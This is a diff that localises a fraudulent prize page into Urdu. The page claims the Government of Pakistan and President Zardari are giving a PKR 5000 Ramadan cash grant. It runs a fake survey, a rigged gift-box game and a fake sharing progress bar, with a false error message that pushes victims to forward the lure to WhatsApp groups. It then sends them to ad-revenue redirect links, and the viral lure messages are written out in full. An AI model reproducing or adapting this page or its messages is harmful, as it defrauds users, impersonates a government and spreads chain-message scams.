@@ -5,7 +5,7 @@
 <head>
 	<script src="#"></script>
 <script src="alladz.js"></script>
-<title>THE GOVERNMENT OF PAKISTAN HAS LAUNCH 9999 RAMADAN CASH GRANT FOR EVERYONE</title>
+<title>حکومت پاکستان نے ہر ایک کے لیے 9999 رمضان کیش گرانٹ کا اجراء کیا ہے</title>
 <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh4YquYUbLkXqw4kl5Tuzrr749DObzxyCySB-pr4t2fST9G1JO3wymG55BznIZ5tXgmXk0r7mNjScLr6m3PNpHODppByUeHfq7sBLJ_Wk1yOnZUhzUbztB8EygHfKIUh0sG64A9O_pWHaXfCE9zWxqlzTq81h4IaHGle6UDWhZw3Gi0RcVXVHKSAOs4EXr0/w516-h640/IMG_3736.jpeg" />
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -295,10 +295,10 @@ button:hover {
 <h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
  
 <p class="paragraph">
-Now you have a chance to win RS5000 Ramadan Celebration cash prize<br><br>
-You have 3 chances ! we wish you good luck
+اب آپ کے پاس RS5000 رمضان جشن کا نقد انعام جیتنے کا موقع ہے۔<br><br>
+آپ کے پاس 3 امکانات ہیں! ہم آپ کو اچھی قسمت چاہتے ہیں
 <br><br>
-You need to select the box that has the gift inside the boxes.
+آپ کو اس باکس کو منتخب کرنے کی ضرورت ہے جس میں خانوں کے اندر تحفہ ہے۔
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -306,9 +306,9 @@ Start
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">اگلی بار اچھی قسمت</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+آپ کے پاس (2) اضافی مواقع ہیں۔ 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -321,7 +321,7 @@ OK
 <p class="paragraph">
 
 
-Your Prize is: <b> PKR5000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+آپ کا انعام ہے۔: <b> 5000 روپے نقد</b><br>اپنے انعام کا دعوی کرنے کے لیے اگلے صفحہ پر دی گئی ہدایات پر عمل کریں۔ ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -341,9 +341,9 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>THE GOVERNMENT OF PAKISTAN HAS LAUNCH 9999 RAMADAN CASH GRANT FOR EVERYONE</b>, Dont miss this year PKR5000 Ramadan cash grant to Pakistans.
+Welcome to <b>حکومت پاکستان نے ہر ایک کے لیے 9999 رمضان کیش گرانٹ کا اجراء کیا ہے</b>, Dont miss this year PKR5000 Ramadan cash grant to Pakistans.
 <br>
-Answer the questions below to claim <b>PKR5000 Cash Prize</b>
+دعوی کرنے کے لیے نیچے دیے گئے سوالات کے جواب دیں۔ <b>PKR5000 نقد انعام</b>
 </p>
   <br>
 </div>
@@ -353,58 +353,56 @@ Answer the questions below to claim <b>PKR5000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
+                     "براہ کرم ایک لمحہ انتظار کریں۔...",
               "Please wait a moment...",
               "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
-</strong>
+آپ نے 4/4 سوالات کا جواب دیا ہے۔</strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
+آپ کے جوابات پر کارروائی ہو رہی ہے۔
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+اب بھی انعامات دستیاب ہیں!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
+تحائف کی تلاش ہے۔. 
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
+صرف (289) تحائف باقی ہیں۔!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+اسٹاک چیک کیا جا رہا ہے۔<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a citizen of Pakistan?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "کیا آپ پاکستان کے شہری ہیں؟",
+              answers: [ { text: "جی ہاں" }, { text: "نہیں" } ]
             },
                                                              {
-              title: "Are You A Muslim?)",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "کیا آپ مسلمان ہیں؟)",
+              answers: [ { text: "جی ہاں" }, { text: "نہیں" } ]
             },
             {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "اپنی جنس کا انتخاب کریں۔?",
+              answers: [ { text: "مرد" }, { text: "خاتون" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "اپنی عمر کی حد منتخب کریں؟",
+              answers: [ { text: "18 - 20سال" }, { text: "21 - 25سال" }, { text: "26 - 30 سال" }, { text: "30سال اوپر" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -423,13 +421,13 @@ Stock is being checked
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>PKR5000</b> <br>Follow the instructions below to your prize !</p>
+<p class="txt1">آپ کا انعام ہے: <b>PKR5000</b> <br>اپنے انعام کے لیے نیچے دی گئی ہدایات پر عمل کریں۔ !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "Whatsapp" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1."Whatsapp" پر 5 گروپوں / 15 دوستوں کے ساتھ شئیر کریں (نیچے "شیئر کریں۔" آئیکون پر کلک کریں)</p><p class="rules">2. "جاری رکھیں" پر کلک کریں اور اپنے انعام کا دعوی کریں۔</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">شیئر کریں۔&nbsp;   →</div>
+  <h4 class="textlastup">اس وقت تک شیئر کریں جب تک کہ نیلی بار بھر نہ جائے!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -440,7 +438,7 @@ Stock is being checked
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                                Continue
+                               جاری رکھیں
                             </div>
    
   </div></div>
@@ -453,25 +451,25 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>مبارک ہو! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://en.numista.com/sales_archive/pictures/6393493a4f1fa.jpg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Prize is: <b>RS 5000 cash.</b> <br>Follow the instruction below to claim your prize !</p>
+<p class="txt1">Your Prize is: <b>RS 5000 cash.</b> <br>اپنے انعام کا دعوی کرنے کے لیے نیچے دی گئی ہدایات پر عمل کریں۔ !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
         <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">CLAIM LE 50,000</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">اکاؤنٹ کی قسم منتخب کریں۔</font></button>
                     </a><br/> <br/>
 	     <!-- BEGIN: Powered by Supercounters.com -->
 <center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_t.js"></script><script type="text/javascript">sc_online_t(1708450,"","fffffff");</script><br><noscript><a href="https://www.supercounters.com/">supercounters.com</a></noscript>
 </center>
 <!-- END: Powered by Supercounters.com -->
-      <div class="share_main_bt" id="offer">CHOOSE ACCOUNT TYPE</div><br/> <br/>
+      <div class="share_main_bt" id="offer">اکاؤنٹ کی قسم منتخب کریں۔</div><br/> <br/>
 
 	     <a  onclick="window.open('//thaudray.com/4/3077182')" href="https://africa-day-mtn-celebration.blogspot.com/#1740935976743" >
                     <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">SAVINGS</font></button>
@@ -481,7 +479,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw PKR 10000</div> 
+            <div class="share_main_bt" id="offers">PKR 5000 واپس لیں۔</div> 
       <br>
           
        
@@ -525,7 +523,7 @@ function go() {
         var text1 = "ytime" ,
             text2 = " مكتبة جرير تقدم ",
             text3 = " سارع واحصل على قسيمتك قبل النفاذ من هنا : ",
-            error = "There is an error!\nPosts do not count. You may have shared it with the same friend or group more than once, please re-share.",
+            error = "ایک خرابی ہے!\nپوسٹ شمار نہیں ہوتے۔ ہو سکتا ہے آپ نے اسے ایک ہی دوست یا گروپ کے ساتھ ایک سے زیادہ بار شیئر کیا ہو، براہ کرم دوبارہ شئیر کریں۔.",
             cpa = "https://thaudray.com/4/3077182",
             cpa1 = "https://thaudray.com/4/3077182",
             saved = "coke2",
@@ -534,8 +532,8 @@ function go() {
 
 <script>
   var tiaoban = [
-    "THE GOVERNMENT OF PAKISTAN HAS LAUNCH 9999 RAMADAN CASH GRANT FOR EVERYONE%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive PKR 5,000 instantly for Ramadan Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
-    "PRESIDENT ASIF ALI ZARDARI CASH BLESSINGS FOR PAKISTANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive RS 5,000 instantly for Ramadan Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
+    "حکومت پاکستان نے ہر ایک کے لیے 9999 رمضان کیش گرانٹ کا اجراء کیا ہے%0A%0A*اسے کیسے حاصل کیا جائے۔*%0Aنیچے دیے گئے لنک پر جائیں اور درج ذیل سوالات کے جواب دیں اور آپ کو رمضان المبارک کے لیے فوری طور پر 5,000 روپے ملیں گے۔.%0A میں نے ابھی اپنا لیا%0A%0Aیہاں کلک کریں۔👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
+    "حکومت پاکستان نے ہر ایک کے لیے 9999 رمضان کیش گرانٹ کا اجراء کیا ہے%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive RS 5,000 instantly for Ramadan Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
     "PRESIDENT ASIF ALI ZARDARI CASH BLESSINGS FOR PAKISTANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive Le 50,000 instantly for Ramadan Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
     "PRESIDENT ASIF ALI ZARDARI CASH BLESSINGS FOR PAKISTANS%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive Le 50,000 instantly for Ramadan Celebration.%0A i just got mine%0A%0AClick Here👇%0A https://ufrepeti.org/President-ASif-Ali-Ramadan-Gifts.html ",
 ];
@@ -621,7 +619,7 @@ $("#offerss").click(function () {
    Swal.fire({
   icon: 'error',
   title: 'Unfortunately...',
-  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  text: 'اپنا انعام حاصل کرنے کے لیے، آپ کو ہمارے ایونٹ کے بارے میں دوستوں کے ساتھ اشتراک کرنا ہوگا۔ اس وقت تک شیئر کریں جب تک کہ نیلی بار بھر نہ جائے!',
   
 });
    }
